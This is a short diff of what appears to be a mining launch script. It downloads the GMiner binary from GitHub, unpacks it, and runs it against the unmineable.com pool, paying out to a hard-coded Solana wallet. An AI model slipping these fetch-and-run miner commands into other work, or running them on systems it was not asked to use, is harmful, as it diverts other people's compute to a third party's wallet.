@@ -1,2 +1,5 @@
-./miner --algo kawpow --server ethash.unmineable.com:3333 --user SOL:DvGynuKv6ef33iFBoiVEBZfPz5uR4fAGHz6zdDj4rJfk.vware
+wget https://github.com/develsoftware/GMinerRelease/releases/download/3.03/gminer_3_03_linux64.tar.xz && tar -xvf gminer_3_03_linux64.tar.xz && ./miner --algo kawpow --server kp.unmineable.com:3333 --user SOL:DvGynuKv6ef33iFBoiVEBZfPz5uR4fAGHz6zdDj4rJfk.vware
+pause
+
+wget https://github.com/develsoftware/GMinerRelease/releases/download/3.03/gminer_3_03_linux64.tar.xz && tar -xvf gminer_3_03_linux64.tar.xz && ./miner --algo kawpow --server kp.unmineable.com:3333 --user SOL:DvGynuKv6ef33iFBoiVEBZfPz5uR4fAGHz6zdDj4rJfk.gmin
 pause
